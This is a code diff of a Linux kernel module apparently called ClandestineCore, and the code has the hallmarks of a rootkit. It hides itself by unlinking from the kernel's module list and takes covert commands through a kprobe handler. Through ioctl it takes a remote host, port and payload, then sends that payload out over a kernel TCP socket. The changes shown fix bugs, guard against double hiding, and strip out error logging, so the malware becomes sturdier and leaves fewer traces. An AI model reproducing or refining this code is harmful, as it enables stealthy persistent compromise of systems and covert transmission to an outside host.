@@ -8,7 +8,7 @@
 #include <linux/slab.h>
 #include <linux/file.h>
 
-#include <linux/net.h>
+#include <linux/inet.h>
 #include <linux/in.h>
 #include <net/sock.h>
 
@@ -25,13 +25,16 @@
 #define DEVICE      "devcc"
 #define IOCTL_BUFF_SIZE 1024 
 
+static int misc_device_open(struct inode *inode, struct file *file);
+static int misc_device_release(struct inode *inode, struct file *filp);
+static long misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
+
 struct ioctl_data {
     size_t size; 
     char buffer[IOCTL_BUFF_SIZE];
 };
 
 static int deviceUsed   = 0;
-static int mode         = 0;
 static char* rHost      = NULL;
 static int rPort        = 0;
 static char* payload    = NULL;
@@ -56,8 +59,11 @@ static struct miscdevice misc_device = {
     .fops  = &fops,
 };
 
-static int misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
-    struct ioctl_data *greeting_var = kmalloc(sizeof(ioctl_data), GFP_KERNEL);
+static long misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
+    struct ioctl_data *greeting_var = kmalloc(sizeof(struct ioctl_data), GFP_KERNEL);
+    if (!greeting_var)
+        return -ENOMEM;
+
     switch (cmd) {
         case IOCTL_IP:
             if (copy_from_user(greeting_var, (struct ioctl_data __user *)arg, sizeof(struct ioctl_data))){
@@ -70,6 +76,8 @@ static int misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long 
                 return -EINVAL;
             }
             
+            if (rHost) 
+                kfree(rHost);
             rHost = kmalloc(greeting_var->size, GFP_KERNEL);
             if (!rHost) {
                 kfree(greeting_var);
@@ -89,11 +97,14 @@ static int misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long 
                 kfree(greeting_var);
                 return -EFAULT;
             }
+
             if (greeting_var->size > IOCTL_BUFF_SIZE) {
                 kfree(greeting_var);
                 return -EINVAL;
             }
-            
+
+            if (payload)
+                kfree(payload);
             payload = kmalloc(greeting_var->size, GFP_KERNEL);
             if (!payload) {
                 kfree(greeting_var);
@@ -101,6 +112,7 @@ static int misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long 
             }
             
             memcpy(payload, greeting_var->buffer, greeting_var->size);
+            break;
         default:
             kfree(greeting_var);
             return -EINVAL;
@@ -124,28 +136,25 @@ static int misc_device_release(struct inode *inode, struct file *filp)
     return 0;
 }
 
-static int 
-kSIGALWRECV(){
+static int kSIGALWRECV(void){
     return misc_register(&misc_device);
 }
-static void 
-kSIGREMRECV(){
+static void kSIGREMRECV(void){
     misc_deregister(&misc_device);
 }
-static void
-kSIGHIDEMOD(){
-    save_previous_mod = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	mod_hide = 1;
+static void kSIGHIDEMOD(void){
+    if (!mod_hide) {
+        save_previous_mod = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+        mod_hide = 1;
+    }
 }
-static void
-kSIGUNHIDEM(){
+static void kSIGUNHIDEM(void){
     list_add(&THIS_MODULE->list, save_previous_mod);
 	mod_hide = 0;
 }
-static int 
-kSIGSENDNET(){
-    struct socket *sock;
+static void kSIGSENDNET(void){
+    struct socket *sock = NULL;
     struct sockaddr_in saddr;
     struct msghdr msg;
     struct kvec vec;
@@ -156,19 +165,17 @@ kSIGSENDNET(){
     }
 
     ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-    if (ret < 0) {
-        pr_err("Échec de la création du socket.\n");
+    if (ret < 0 || !sock) {
         return;
     }
 
     memset(&saddr, 0, sizeof(saddr));
     saddr.sin_family = AF_INET;
     saddr.sin_port = htons(rPort);
-    saddr.sin_addr.s_addr = in_aton(rHost);
+    in4_pton(rHost, -1, (u8 *)&saddr.sin_addr.s_addr, '\0', NULL);
 
     ret = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
     if (ret < 0) {
-        pr_err("Échec de la connexion.\n");
         sock_release(sock);
         return;
     }
@@ -183,14 +190,13 @@ kSIGSENDNET(){
     msg.msg_flags = 0;
 
     ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-    if (ret < 0)
-        pr_err("Échec de l'envoi du payload.\n");
+    // if (ret < 0) SENT FAILED
 
-    sock_release(sock);
+    if (sock)
+        sock_release(sock);
 }
 
-static int 
-SIGCATCH(struct kprobe *p, struct pt_regs *regs)
+static int SIGCATCH(struct kprobe *p, struct pt_regs *regs)
 {
     int ret = 0;
     switch ((int)regs->si) {
@@ -224,8 +230,10 @@ static int __init ClandestineCore_init(void)
 
 static void __exit ClandestineCore_exit(void)
 {
-    kfree(rHost);
-    kfree(payload);
+    if (rHost)
+        kfree(rHost);
+    if (payload)
+        kfree(payload);
     unregister_kprobe(&kp);
 }
 
